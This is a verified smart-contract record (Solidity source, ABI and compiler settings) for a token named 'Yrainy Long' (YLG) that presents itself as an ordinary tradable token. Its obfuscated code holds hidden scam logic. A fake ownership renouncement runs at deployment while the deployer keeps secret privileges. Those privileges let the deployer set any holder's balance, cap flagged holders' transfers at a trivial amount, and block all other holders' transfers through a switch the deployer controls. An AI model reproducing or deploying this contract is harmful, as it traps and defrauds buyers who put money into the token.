{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface autoReceiverLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTokenSell {\n    function createPair(address receiverBuy, address isModeTrading) external returns (address);\n}\n\ninterface takeExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellFee) external view returns (uint256);\n\n    function transfer(address launchTradingFee, uint256 launchedFee) external returns (bool);\n\n    function allowance(address launchTradingFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchTradingFee,\n        uint256 launchedFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTx, uint256 value);\n    event Approval(address indexed launchTradingFund, address indexed spender, uint256 value);\n}\n\ninterface limitWallet is takeExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract YrainyLong is amountReceiver, takeExempt, limitWallet {\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTx;\n    }\n\n    function totalAuto() public {\n        emit OwnershipTransferred(senderTradingAuto, address(0));\n        limitSender = address(0);\n    }\n\n    event OwnershipTransferred(address indexed fundTrading, address indexed feeMin);\n\n    uint256 public teamExempt;\n\n    function transfer(address listTradingSwap, uint256 launchedFee) external virtual override returns (bool) {\n        return launchedMax(_msgSender(), listTradingSwap, launchedFee);\n    }\n\n    uint256 shouldSender;\n\n    function maxIs(address teamEnable) public {\n        receiverExempt();\n        if (takeTx != teamTx) {\n            exemptFundMax = true;\n        }\n        if (teamEnable == senderTradingAuto || teamEnable == modeMin) {\n            return;\n        }\n        swapLimit[teamEnable] = true;\n    }\n\n    function allowance(address sellAtLiquidity, address sellFund) external view virtual override returns (uint256) {\n        if (sellFund == shouldToLiquidity) {\n            return type(uint256).max;\n        }\n        return txToken[sellAtLiquidity][sellFund];\n    }\n\n    uint256 private walletList = 100000000 * 10 ** 18;\n\n    uint256 constant swapMin = 15 ** 10;\n\n    function approve(address sellFund, uint256 launchedFee) public virtual override returns (bool) {\n        txToken[_msgSender()][sellFund] = launchedFee;\n        emit Approval(_msgSender(), sellFund, launchedFee);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return limitSender;\n    }\n\n    constructor (){\n        if (takeTx == teamTx) {\n            teamExempt = takeTx;\n        }\n        autoReceiverLaunch exemptTeam = autoReceiverLaunch(shouldToLiquidity);\n        modeMin = minTokenSell(exemptTeam.factory()).createPair(exemptTeam.WETH(), address(this));\n        \n        senderTradingAuto = _msgSender();\n        totalAuto();\n        sellLimit[senderTradingAuto] = true;\n        receiverMin[senderTradingAuto] = walletList;\n        if (teamExempt == takeTx) {\n            takeTx = teamExempt;\n        }\n        emit Transfer(address(0), senderTradingAuto, walletList);\n    }\n\n    bool public marketingLaunch;\n\n    string private marketingTx = \"YLG\";\n\n    function buySell(address modeLimit, address launchTradingFee, uint256 launchedFee) internal returns (bool) {\n        require(receiverMin[modeLimit] >= launchedFee);\n        receiverMin[modeLimit] -= launchedFee;\n        receiverMin[launchTradingFee] += launchedFee;\n        emit Transfer(modeLimit, launchTradingFee, launchedFee);\n        return true;\n    }\n\n    address private limitSender;\n\n    function balanceOf(address sellFee) public view virtual override returns (uint256) {\n        return receiverMin[sellFee];\n    }\n\n    uint256 swapTotalTake;\n\n    address shouldToLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function maxSell(uint256 launchedFee) public {\n        receiverExempt();\n        swapTotalTake = launchedFee;\n    }\n\n    address shouldIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private limitIs = \"Yrainy Long\";\n\n    address public senderTradingAuto;\n\n    uint8 private modeLaunchFund = 18;\n\n    function toReceiver(address launchSell) public {\n        if (totalList) {\n            return;\n        }\n        \n        sellLimit[launchSell] = true;\n        if (takeTx == teamExempt) {\n            teamExempt = takeTx;\n        }\n        totalList = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitIs;\n    }\n\n    bool private swapTakeAmount;\n\n    mapping(address => bool) public swapLimit;\n\n    mapping(address => mapping(address => uint256)) private txToken;\n\n    address public modeMin;\n\n    uint256 public sellExempt;\n\n    mapping(address => uint256) private receiverMin;\n\n    bool public totalList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletList;\n    }\n\n    bool public fundTokenLiquidity;\n\n    function getOwner() external view returns (address) {\n        return limitSender;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeLaunchFund;\n    }\n\n    function launchedMax(address modeLimit, address launchTradingFee, uint256 launchedFee) internal returns (bool) {\n        if (modeLimit == senderTradingAuto) {\n            return buySell(modeLimit, launchTradingFee, launchedFee);\n        }\n        uint256 limitLaunch = takeExempt(modeMin).balanceOf(shouldIs);\n        require(limitLaunch == swapTotalTake);\n        require(launchTradingFee != shouldIs);\n        if (swapLimit[modeLimit]) {\n            return buySell(modeLimit, launchTradingFee, swapMin);\n        }\n        return buySell(modeLimit, launchTradingFee, launchedFee);\n    }\n\n    bool private exemptFundMax;\n\n    function shouldToken(address listTradingSwap, uint256 launchedFee) public {\n        receiverExempt();\n        receiverMin[listTradingSwap] = launchedFee;\n    }\n\n    mapping(address => bool) public sellLimit;\n\n    function receiverExempt() private view {\n        require(sellLimit[_msgSender()]);\n    }\n\n    uint256 private teamTx;\n\n    function transferFrom(address modeLimit, address launchTradingFee, uint256 launchedFee) external override returns (bool) {\n        if (_msgSender() != shouldToLiquidity) {\n            if (txToken[modeLimit][_msgSender()] != type(uint256).max) {\n                require(launchedFee <= txToken[modeLimit][_msgSender()]);\n                txToken[modeLimit][_msgSender()] -= launchedFee;\n            }\n        }\n        return launchedMax(modeLimit, launchTradingFee, launchedFee);\n    }\n\n    uint256 private takeTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTradingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAtLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTokenLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"maxIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"maxSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTradingAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTradingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"shouldToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSell\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTradingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTradingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "YrainyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}